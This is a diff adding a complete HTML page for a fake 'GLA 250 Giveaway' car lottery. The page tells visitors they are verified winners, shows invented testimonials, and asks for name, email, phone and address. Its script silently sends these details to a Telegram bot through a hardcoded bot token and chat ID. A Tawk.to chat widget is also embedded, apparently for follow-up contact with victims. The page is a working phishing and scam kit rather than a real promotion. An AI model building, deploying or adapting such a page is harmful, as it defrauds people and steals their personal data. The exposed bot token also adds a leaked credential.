@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>GLA 250 Giveaway</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+    body, html {
+      height: 100%; font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(45deg, rgba(0,15,28,0.95), rgba(0,163,143,0.15));
+      color: white; overflow-x: hidden;
+    }
+    nav {
+      position: fixed; top: 0; width: 100%; background: rgba(0, 0, 0, 0.85);
+      padding: 15px 20px; z-index: 10; display: flex; justify-content: space-between; align-items: center;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    nav div { color: #FFD700; font-size: 1.5em; font-weight: bold; }
+    nav a {
+      color: #00ffcc; font-size: 1em; text-decoration: none;
+      background: #000; padding: 10px 20px; border-radius: 5px; transition: background 0.3s;
+    }
+    nav a:hover { background: #222; }
+    .video-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; overflow: hidden; z-index: -1; }
+    .video-bg video { width: 100%; height: 100%; object-fit: cover; }
+    .overlay { background: rgba(0, 0, 0, 0.7); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
+    header {
+      padding: 140px 20px 40px; text-align: center; position: relative; z-index: 1;
+    }
+    header h1 { font-size: 3.5em; color: #FFD700; margin-bottom: 10px; }
+    header p { font-size: 1.3em; max-width: 700px; margin: 0 auto; color: #ccc; }
+    .container {
+      position: relative; z-index: 1; max-width: 900px; margin: 0 auto; padding: 20px;
+    }
+    .hero-image { text-align: center; margin: 30px 0; }
+    .hero-image img {
+      width: 100%; border-radius: 15px; box-shadow: 0 0 30px rgba(0,0,0,0.5);
+    }
+    .countdown { text-align: center; margin: 40px 0; }
+    #timer { font-size: 2.5em; color: #00ffcc; font-weight: bold; }
+    .claim-form {
+      background: rgba(255, 255, 255, 0.95); padding: 35px; border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3); color: #000; margin-top: 40px;
+    }
+    .claim-form h2 { text-align: center; margin-bottom: 15px; }
+    .claim-form p { text-align: center; font-size: 1.1em; margin-bottom: 20px; }
+    .claim-form input, .claim-form select {
+      width: 100%; padding: 14px; margin: 10px 0; font-size: 16px;
+      border-radius: 5px; border: 1px solid #aaa;
+    }
+    .claim-form button {
+      width: 100%; padding: 14px; background-color: #000; color: white;
+      border: none; font-size: 18px; border-radius: 5px; cursor: pointer;
+      transition: background 0.3s ease; position: relative;
+    }
+    .claim-form button.loading { pointer-events: none; color: transparent; }
+    .claim-form button.loading::after {
+      content: "⏳ Sending..."; position: absolute; left: 50%; top: 50%;
+      transform: translate(-50%, -50%); color: #fff; font-weight: bold;
+    }
+    .claim-form button:hover { background-color: #333; }
+    .logo-container img.logo { height: 50px; width: auto; margin-right: 50px; vertical-align: middle; }
+    .success-message {
+      display: none; text-align: center; color: green; font-weight: bold; margin-top: 20px;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .tracking { text-align: center; margin-top: 25px; }
+    .tracking a {
+      display: inline-block; margin-top: 10px; background: #00ffcc; color: #000;
+      padding: 12px 24px; border-radius: 5px; font-weight: bold; text-decoration: none;
+      transition: background 0.3s;
+    }
+    .tracking a:hover { background: #00ddb3; }
+    .testimonials { text-align: center; margin: 60px 0; }
+    .testimonial-carousel { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; margin-top: 20px; }
+    .testimonial {
+      background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px;
+      max-width: 350px; box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    }
+    .testimonial p { font-style: italic; color: #ccc; }
+    .testimonial strong { display: block; margin-top: 10px; color: #FFD700; }
+    footer {
+      text-align: center; padding: 40px 20px; font-size: 0.9em; color: #bbb;
+    }
+    footer a { color: #fff; text-decoration: underline; }
+    @media (max-width: 768px) {
+      header h1 { font-size: 2.2em; }
+      #timer { font-size: 1.5em; }
+      .hero-image img { height: auto; }
+      nav { flex-direction: column; gap: 10px; text-align: center; }
+    }
+    @media (max-width: 450px) {
+  nav {
+    flex-direction: column;
+    gap: 10px;
+    padding: 10px;
+  }
+
+  nav div {
+    font-size: 1.2em;
+    text-align: center;
+  }
+
+  nav a {
+    font-size: 0.95em;
+    padding: 8px 16px;
+  }
+
+  header h1 {
+    font-size: 2em;
+    padding-top: 60px;
+  }
+
+  header p {
+    font-size: 1em;
+    padding: 0 10px;
+  }
+
+  .claim-form {
+    padding: 20px;
+  }
+
+  .claim-form input,
+  .claim-form select,
+  .claim-form button {
+    font-size: 14px;
+    padding: 12px;
+  }
+
+  .testimonial-carousel {
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .testimonial {
+    max-width: 90%;
+  }
+
+  #timer {
+    font-size: 1.8em;
+  }
+
+  footer {
+    font-size: 0.8em;
+  }
+}
+  </style>
+</head>
+<body>
+  <nav>
+    <div class="logo-container">
+      <img src="image2.png" alt="Grand Cars Logo" class="logo"/>
+    </div>
+    <a href="#claim-section">Claim Now</a>
+  </nav>
+
+  <div class="video-bg">
+    <video autoplay muted loop playsinline>
+      <source src="Video/Cla.mp4" type="video/mp4" />
+      Your browser does not support the video tag.
+    </video>
+    <div class="overlay"></div>
+  </div>
+
+  <header>
+    <h1>Win a GLA 250 4MATIC SUV</h1>
+    <p>Enter our exclusive giveaway to win the luxurious and powerful Mercedes-Benz GLA 250 4MATIC SUV.</p>
+  </header>
+
+  <div class="container">
+    <div class="hero-image">
+      <img src="https://www.mbusa.com/content/dam/mb-nafta/us/myco/my25/gla-class/class-page/series/2025-GLA-SUV-HERO-DR.jpg" alt="GLA 250 4MATIC SUV" />
+    </div>
+
+    <div class="countdown">
+      <h2>Giveaway ends in:</h2>
+      <div id="timer">Loading...</div>
+    </div>
+
+    <div class="claim-form" id="claim-section">
+      <h2>🎉 Congratulations!</h2>
+      <p>You’re a verified winner! Fill out the form to claim your brand new GLA 250.</p>
+      <form id="claimForm">
+        <input type="text" id="name" placeholder="Full Name" required />
+        <input type="email" id="email" placeholder="Email Address" required />
+        <input type="tel" id="phone" placeholder="Phone Number" required />
+        <input type="text" id="address" placeholder="Delivery Address" required />
+        <select id="carColor" required>
+          <option value="">Select Preferred Car Color</option>
+          <option value="Red">Red</option>
+          <option value="Black">Black</option>
+          <option value="White">White</option>
+          <option value="Silver">Silver</option>
+        </select>
+        <button type="submit" id="submitBtn">Claim Your Car</button>
+      </form>
+      <div class="success-message" id="successMessage">
+        🎉 Congratulations! 🎉<br>We’re pleased to confirm that your information has been successfully verified by Grand Car Lottery.<br>Please check your email for your tracking details to monitor the delivery status of your brand new vehicle.
+      </div>
+      <div class="tracking">
+        <p>Track your vehicle delivery:</p>
+        <a href="tracking.html" target="_blank">Track Your Car</a>
+      </div>
+    </div>
+
+    <div class="testimonials">
+      <h2>What Our Winners Say</h2>
+      <div class="testimonial-carousel">
+        <div class="testimonial">
+          <p>"I still can't believe I won a GLA! The process was quick and transparent."</p>
+          <strong>- Sarah M., Chicago</strong>
+        </div>
+        <div class="testimonial">
+          <p>"Grand Car Lottery is 100% real. I received my vehicle in under two weeks."</p>
+          <strong>- James R., Miami</strong>
+        </div>
+        <div class="testimonial">
+          <p>"This giveaway changed my life. I recommend everyone to participate!"</p>
+          <strong>- Aisha K., New York</strong>
+        </div>
+        <div class="testimonial">
+          <p>"The delivery was faster than I expected. The car was in perfect condition."</p>
+          <strong>- Michael T., Los Angeles</strong>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    <p>&copy; 2025 GLA 250 Giveaway. All Rights Reserved.</p>
+    <p>This giveaway is not affiliated with Mercedes-Benz. See our <a href="terms.html">Terms</a> and <a href="privacy.html">Privacy Policy</a>.</p>
+  </footer>
+
+  <script>
+    const timerElement = document.getElementById("timer");
+    const drawDate = new Date("2025-12-31T23:59:59").getTime();
+
+    function updateCountdown() {
+      const now = new Date().getTime();
+      const distance = drawDate - now;
+      if (distance <= 0) {
+        timerElement.textContent = "Giveaway Closed";
+        return;
+      }
+      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+      timerElement.textContent = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+    }
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    const form = document.getElementById("claimForm");
+    const btn = document.getElementById("submitBtn");
+    const successMessage = document.getElementById("successMessage");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      if (btn.classList.contains("loading")) return;
+      btn.classList.add("loading");
+      btn.disabled = true;
+
+      const name = document.getElementById("name").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const address = document.getElementById("address").value.trim();
+      const carColor = document.getElementById("carColor").value;
+
+      const message = `🚗 *New GLA Claim Submission*\n\n👤 Name: ${name}\n📧 Email: ${email}\n📞 Phone: ${phone}\n🏠 Address: ${address}\n🎨 Color: ${carColor}`;
+      const botToken = "7992442936:AAG_UqQbaTd5DbpsJAXq2T5QWXzX9E-tjXQ";
+      const chatId = "7638981861";
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          successMessage.style.display = "block";
+          form.reset();
+        } else {
+          alert("There was an error. Please try again.");
+        }
+      })
+      .catch(error => {
+        alert("Failed to connect to the server.");
+        console.error(error);
+      })
+      .finally(() => {
+        btn.classList.remove("loading");
+        btn.disabled = false;
+      });
+    });
+  </script>
+
+  <!--Start of Tawk.to Script-->
+  <script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/6835fae3faf85f190c60d1f1/1is9do2eb';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+  <!--End of Tawk.to Script-->
+</body>
+</html>
